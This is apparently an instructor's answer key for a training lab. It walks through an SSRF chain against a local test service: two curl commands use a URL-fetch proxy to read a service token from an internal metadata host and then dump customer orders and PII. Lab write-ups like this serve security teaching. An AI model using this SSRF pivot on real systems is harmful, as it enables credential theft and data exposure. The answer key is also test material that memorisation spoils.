# Solution — 07 Bazaar (medium)

> Spoilers — instructor's answer key.

## Discovery (non-obvious)

The edge exposes only `/` and `/api/fetch`. Reading the shipped bundle `/app.js` reveals the
SSRF sink (`/api/fetch?url=`) and the internal hostnames `metadata.internal` and
`orders.internal` — neither is in any wordlist.

## Chain (SSRF pivot across the segment)

1. **SSRF** — the link-preview proxy fetches any URL server-side:
   ```sh
   curl -s 'http://127.0.0.1:8107/api/fetch?url=http://metadata.internal/creds'
   ```
   returns the internal **service token** `svc-orders-7ymar9-internal`.
2. **Reach the internal order API through the same SSRF** (it is unroutable directly),
   passing the token as a query param:
   ```sh
   curl -s 'http://127.0.0.1:8107/api/fetch?url=http://orders.internal/orders?token=svc-orders-7ymar9-internal'
   ```
   returns **customer orders + PII** (names, emails, card last-4, ship-to).

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `internal-hostnames` | `metadata.internal`, `orders.internal`, `/api/fetch` | `/app.js` |
| `service-token` | `svc-orders-7ymar9-internal` | metadata mock (`/creds`) via SSRF |
| `customer-orders` | `p.raman@meridian-freight.example`, … | internal order API via SSRF |

## Reset

`make lab-restore LAB=07-medium-bazaar-microservices` (recreate — services reload their
baked-in data).
